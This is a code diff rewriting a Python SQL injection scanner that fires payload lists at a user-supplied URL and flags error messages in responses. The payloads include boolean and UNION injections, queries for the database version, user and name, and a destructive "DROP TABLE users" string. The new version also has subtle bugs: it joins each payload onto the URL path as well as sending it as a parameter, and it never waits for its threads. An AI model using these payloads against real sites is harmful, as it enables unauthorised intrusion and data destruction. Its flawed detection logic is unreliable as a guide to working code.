@@ -2,111 +2,60 @@ import requests
 import logging
 import threading
 import shutil
-import os
-from urllib.parse import urlparse, urljoin
+import inspect
+from urllib.parse import urljoin
 from bs4 import BeautifulSoup
-import time
-from inspect import currentframe
 
-# Define user-agent and headers
-headers = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-}
+# Configure logging
+logging.basicConfig(level=logging.INFO,
+                    format='[%(asctime)s] - %(levelname)s - %(message)s',
+                    handlers=[logging.StreamHandler()])
 
-# Initialize logger
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[
-        logging.FileHandler("sqlscan.log"),
-        logging.StreamHandler()
-    ]
-)
-
-# SQL Injection payloads
-sql_payloads = [
-    "' OR '1'='1",
-    "' OR 1=1 -- ",
-    "' OR 1=1 #",
-    "' UNION SELECT NULL, NULL, NULL --",
-    "admin'--",
-    "1' AND 1=1",
-    "1' OR 'a'='a",
-    "1' AND 'a'='a' --",
-    "' OR 1=1; --",
-    "' OR 1=1#"
+# List of SQLi payloads
+payloads = [
+    "' OR 1=1 --",         # Classic boolean-based SQLi
+    "' OR 'a'='a' --",     # Another form of boolean-based SQLi
+    "' UNION SELECT NULL, NULL --",  # Union-based SQLi
+    "'; DROP TABLE users; --",  # Attempted SQL injection to delete table
+    "'; SELECT version(); --", # Get database version
+    "'; SELECT user(); --",   # Get current DB user
+    "'; SELECT database(); --", # Get current DB name
 ]
 
-# Extract parameters from URL
-def get_params(url):
-    parsed_url = urlparse(url)
-    base_url = parsed_url.scheme + "://" + parsed_url.netloc
-    response = requests.get(url, headers=headers)
-    
-    if response.status_code != 200:
-        logging.warning(f"Failed to fetch {url}")
-        return []
-    
-    soup = BeautifulSoup(response.text, 'html.parser')
-    params = []
+# Thread worker for scanning a URL
+def scan_url(url, payload):
+    try:
+        response = requests.get(url, params={'id': payload}, timeout=10)
+        
+        # Check for typical SQLi vulnerability responses
+        if "error" in response.text.lower() or "syntax" in response.text.lower():
+            logging.warning(f"Potential SQLi vulnerability detected with payload: {payload} at {url}")
+        elif "mysql" in response.text.lower() or "sql" in response.text.lower():
+            logging.warning(f"Possible SQL injection vulnerability detected with payload: {payload} at {url}")
+        else:
+            logging.info(f"No immediate vulnerability found with payload: {payload} at {url}")
+    except Exception as e:
+        logging.error(f"Error scanning URL {url} with payload {payload}: {str(e)}")
 
-    # Look for GET parameters in all form tags
-    forms = soup.find_all('form')
-    for form in forms:
-        action = form.get('action')
-        if action:
-            action_url = urljoin(url, action)
-            for input_tag in form.find_all('input'):
-                name = input_tag.get('name')
-                if name:
-                    params.append((action_url, name))
+# Function to handle the scanning logic
+def start_scan(base_url):
+    logging.info(f"Starting SQLi scan on: {base_url}")
     
-    return params
-
-# Attempt SQL injection
-def attempt_sqli(url, param, payload):
-    payload_url = f"{url}?{param}={payload}"
-    response = requests.get(payload_url, headers=headers)
-    
-    if response.status_code == 200 and "error" in response.text.lower():
-        logging.info(f"Potential SQLi vulnerability found: {payload_url}")
-        return True
-    return False
-
-# Scanner thread
-def scanner_thread(url, param):
-    for payload in sql_payloads:
-        logging.debug(f"Testing payload {payload} on {param}")
-        if attempt_sqli(url, param, payload):
-            logging.info(f"SQLi vulnerability found at {url} with payload {payload}")
-        time.sleep(1)
-
-# Main scanner function
-def scan(url):
-    logging.info(f"Starting SQLi scan on {url}")
-
-    params = get_params(url)
-    if not params:
-        logging.info("No parameters found for SQL injection testing.")
-        return
-    
-    threads = []
-    for url, param in params:
-        thread = threading.Thread(target=scanner_thread, args=(url, param))
-        threads.append(thread)
+    # For each URL, test with multiple payloads
+    for payload in payloads:
+        full_url = urljoin(base_url, payload)
+        thread = threading.Thread(target=scan_url, args=(full_url, payload))
         thread.start()
-    
-    for thread in threads:
-        thread.join()
-    
-    logging.info(f"Scan complete for {url}")
 
+# Main entry point
 if __name__ == "__main__":
     import argparse
-
-    parser = argparse.ArgumentParser(description="Advanced SQL Injection Scanner")
-    parser.add_argument('-u', '--url', type=str, required=True, help="URL to scan for SQL Injection vulnerabilities")
+    parser = argparse.ArgumentParser(description="SQL Injection Brute Force Scanner")
+    parser.add_argument('-u', '--url', required=True, help='URL to scan for SQL injection')
     args = parser.parse_args()
+    
+    if not args.url:
+        logging.error("URL is required. Use -u or --url to provide a URL.")
+        exit(1)
 
-    # Start the scan
-    scan(args.url)
+    start_scan(args.url)
